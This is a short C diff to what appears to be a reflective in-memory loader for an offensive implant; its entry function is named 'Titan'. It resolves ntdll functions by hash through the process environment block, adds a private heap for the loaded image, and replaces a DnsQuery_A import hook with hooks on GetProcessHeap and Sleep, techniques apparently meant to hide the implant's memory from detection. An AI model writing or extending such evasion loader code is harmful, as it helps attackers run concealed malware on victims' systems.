@@ -24,6 +24,7 @@ typedef struct
 	D_API( LdrGetProcedureAddress );
 	D_API( RtlFreeUnicodeString );
 	D_API( RtlInitAnsiString );
+	D_API( RtlCreateHeap );
 	D_API( LdrLoadDll );
 } API, *PAPI;
 
@@ -33,6 +34,7 @@ typedef struct
 #define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
 #define H_API_RTLFREEUNICODESTRING		0x61b88f97 /* RtlFreeUnicodeString */
 #define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
+#define H_API_RTLCREATEHEAP				0xe1af6849 /* RtlCreateHeap */
 #define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
 #define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */
 
@@ -72,6 +74,7 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 	/* Initialize API structures */
 	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
 	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
+	Api.RtlCreateHeap 			= PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEHEAP );
 
 	/* Setup Image Headers */
 	Dos = C_PTR( G_END() );
@@ -102,10 +105,13 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 		/* Get a pointer to the import table */
 		Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
 
+		((PDATA) Mem)->hHeap = Api.RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, 0, NULL);
+
 		if ( Dir->VirtualAddress ) {
 			/* Process Import Table */
 			LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
-			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x36c007a2, PTR_TO_HOOK( Mem, GetProcessHeap_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xe07cd7e,  PTR_TO_HOOK( Mem, Sleep_Hook ) );
 		};
 
 		/* Get a pointer to the relocation table */
